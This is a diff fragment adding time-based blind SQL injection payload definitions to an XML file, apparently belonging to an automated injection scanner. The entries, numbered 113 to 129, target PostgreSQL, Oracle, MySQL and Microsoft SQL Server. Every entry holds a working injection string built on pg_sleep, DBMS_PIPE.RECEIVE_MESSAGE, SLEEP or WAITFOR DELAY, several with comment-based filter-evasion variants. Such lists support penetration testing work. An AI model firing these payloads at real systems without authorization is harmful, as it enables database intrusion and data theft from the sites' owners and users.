+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 113</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'||(pg_sleep([SLEEPTIME]))--</vector>
+        <request>
+            <payload>'||(pg_sleep([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 114</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'||pg_sleep([SLEEPTIME])::text--</vector>
+        <request>
+            <payload>'||pg_sleep([SLEEPTIME])::text--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 115</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual)--</vector>
+        <request>
+            <payload>'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 116</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')); SELECT pg_sleep([SLEEPTIME]);--</vector>
+        <request>
+            <payload>')); SELECT pg_sleep([SLEEPTIME]);--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 117</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; SELECT pg_sleep([SLEEPTIME]);--</vector>
+        <request>
+            <payload>'; SELECT pg_sleep([SLEEPTIME]);--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 118</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>test%') OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>test%') OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 119</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>test') OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>test') OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 120</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; WaItFoR DeLaY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; WaItFoR DeLaY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 121</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>" WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>" WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 122</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>"; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>"; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 123</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>' WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 124</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>' WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 125</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>') WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 126</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')); WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>')); WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 127</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/WAITFOR/**/DELAY/**/'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'/**/WAITFOR/**/DELAY/**/'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 128</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 129</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+</root>
